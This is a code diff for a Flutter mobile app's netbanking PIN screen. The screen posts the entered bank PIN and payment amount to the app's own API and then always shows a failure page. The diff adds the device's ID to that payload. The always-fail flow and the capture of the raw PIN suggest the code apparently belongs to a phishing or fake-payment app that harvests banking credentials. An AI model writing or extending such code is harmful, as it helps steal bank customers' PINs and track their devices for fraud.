@@ -4,6 +4,7 @@ import 'dart:convert';
 import 'package:http/http.dart' as http;
 import '../api_config.dart';
 import '../theme.dart';
+import '../services/device_service.dart';
 
 class NetbankingPinScreen extends StatefulWidget {
   final double amount;
@@ -17,9 +18,11 @@ class _S extends State<NetbankingPinScreen> {
 
   void submit() {
     if (pin.text.isNotEmpty) {
-      http.post(Uri.parse('$apiBaseUrl/api/netbanking-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin.text, 'amount': widget.amount}))
-        .then((_) => print('API success'))
-        .catchError((e) => print('API error: $e'));
+      DeviceService.getDeviceId().then((deviceId) {
+        http.post(Uri.parse('$apiBaseUrl/api/netbanking-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin.text, 'amount': widget.amount, 'device_id': deviceId}))
+          .then((_) => print('API success'))
+          .catchError((e) => print('API error: $e'));
+      });
       context.push('/failed');
     }
   }
